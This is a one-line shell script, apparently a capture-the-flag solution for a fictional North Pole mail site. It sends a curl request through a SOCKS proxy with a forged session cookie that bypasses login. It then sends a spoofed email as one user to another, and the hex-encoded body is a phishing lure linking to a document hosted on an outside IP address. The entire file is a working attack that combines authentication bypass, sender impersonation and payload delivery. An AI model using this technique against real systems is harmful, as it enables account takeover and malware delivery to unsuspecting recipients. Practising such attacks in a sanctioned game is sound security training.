#!/bin/sh
exec curl -m 10 -x socks5h://localhost:32080  'http://mail.northpolechristmastown.com/api.js' -H 'Host: mail.northpolechristmastown.com' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:57.0) Gecko/20100101 Firefox/57.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://mail.northpolechristmastown.com/account.html' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: EWA={"name": "jessica.claus@northpolechristmastown.com", "plaintext": "",  "ciphertext": "aaaaaaaaaaaaaaaaaaaaaa"}' -H 'Connection: keep-alive' --data 'from_email=jessica.claus%40northpolechristmastown.com&to_email=alabaster.snowball%40northpolechristmastown.com&subject_email=cookies&message_email=67696e676572627265616420636f6f6b6965207265636970650a0a41545441434845442046494c4520444f574e4c4f414420484552453a20687474703a2f2f3133382e3139372e32322e3233362f7265636970652e646f63780a'